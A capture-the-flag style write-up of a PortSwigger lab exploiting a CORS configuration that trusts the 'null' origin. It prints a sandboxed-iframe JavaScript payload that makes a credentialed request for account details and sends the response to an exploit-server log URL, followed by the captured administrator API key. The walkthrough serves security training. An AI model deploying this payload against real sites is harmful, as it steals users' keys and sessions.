# CORS vulnerability with trusted null origin

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack), you'll learn: CORS vulnerability with trusted null origin! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This website has an insecure [CORS](https://portswigger.net/web-security/cors) configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-2/images/Pasted%20image%2020221227060104.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-2/images/Pasted%20image%2020221227060113.png)

**In the previous lab, we found that after logged in, it'll send a GET request to `/accountDetails`, which fetches account's data:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-2/images/Pasted%20image%2020221227060127.png)

And it supports CORS(Cross-Origin Resource Sharing).

**Let's send that request to Burp Repeter, and add a HTTP header called `Origin` with a random host:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-2/images/Pasted%20image%2020221227060333.png)

Hmm... The response header doesn't include our origin host.

Maybe it has a whitelist domains?

Now, some applications might whitelist the `null` origin to support local development of the application.

**Let's test `null` origin:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-2/images/Pasted%20image%2020221227060449.png)

It's reflected in the response header!

In this situation, we can use various tricks to generate a cross-origin request containing the value `null` in the Origin header. This will satisfy the whitelist, leading to cross-domain access.

**For example, this can be done using a sandboxed `iframe` cross-origin request:**
```html
<html>
    <head>
        <title>CORS-2</title>
    </head>
    <body>
        <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
            var req = new XMLHttpRequest();
            req.onload = reqListener;
            req.open('get','https://0a6e007004bec549c19b804a0097005f.web-security-academy.net/accountDetails',true);
            req.withCredentials = true;
            req.send();
            function reqListener() {
                location='exploit-0a5f00000465c524c1317f9301160049.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
            };
            </script>">
        </iframe>
    </body>
</html>
```

**Then, host it on the exploit server, and test it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-2/images/Pasted%20image%2020221227062748.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-2/images/Pasted%20image%2020221227062759.png)

**Exploit server access log:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-2/images/Pasted%20image%2020221227062829.png)

**It worked! Let's deliver the exploit to the victim:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-2/images/Pasted%20image%2020221227062855.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-2/images/Pasted%20image%2020221227062918.png)

```json
{
    "username": "administrator",
    "email": "",
    "apikey": "bH4kjHMfSlrABceuqVweDZDJYo7H55do",
    "sessions": [
        "i3pE78c1OzvDZw7YK8AH2YEcD8x5zQCX"
    ]
}
```

**Let's submit the API key:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-2/images/Pasted%20image%2020221227063005.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-2/images/Pasted%20image%2020221227063010.png)

# What we've learned:

1. CORS vulnerability with trusted null origin